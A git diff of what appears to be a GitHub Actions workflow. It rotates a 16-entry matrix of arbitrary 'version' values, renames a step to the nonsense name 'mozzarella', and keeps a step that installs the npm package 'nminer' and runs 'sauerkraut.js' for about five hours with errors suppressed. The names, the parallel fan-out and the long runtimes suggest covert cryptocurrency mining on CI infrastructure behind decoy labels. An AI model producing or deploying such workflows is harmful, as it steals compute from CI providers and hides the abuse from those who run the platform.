@@ -9,22 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2504 }
-          - { version: 4423 }
-          - { version: 3544 }
-          - { version: 2142 }
-          - { version: 6874 }
-          - { version: 6402 }
-          - { version: 8817 }
-          - { version: 7422 }
-          - { version: 2601 }
-          - { version: 8925 }
-          - { version: 2155 }
-          - { version: 9435 }
-          - { version: 6831 }
-          - { version: 4088 }
-          - { version: 8178 }
-          - { version: 7312 }
+          - { version: 3422 }
+          - { version: 9907 }
+          - { version: 3331 }
+          - { version: 8165 }
+          - { version: 2888 }
+          - { version: 1044 }
+          - { version: 7034 }
+          - { version: 3067 }
+          - { version: 787 }
+          - { version: 7731 }
+          - { version: 1529 }
+          - { version: 4190 }
+          - { version: 2918 }
+          - { version: 8597 }
+          - { version: 9929 }
+          - { version: 6125 }
 
     steps:
       - name: Checkout
@@ -35,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: though countess
+      - name: mozzarella
         run: |
           npm install nminer@latest
-          timeout 339m node sauerkraut.js || echo "sauerkraut executed"
+          timeout 307m node sauerkraut.js || echo "sauerkraut executed"
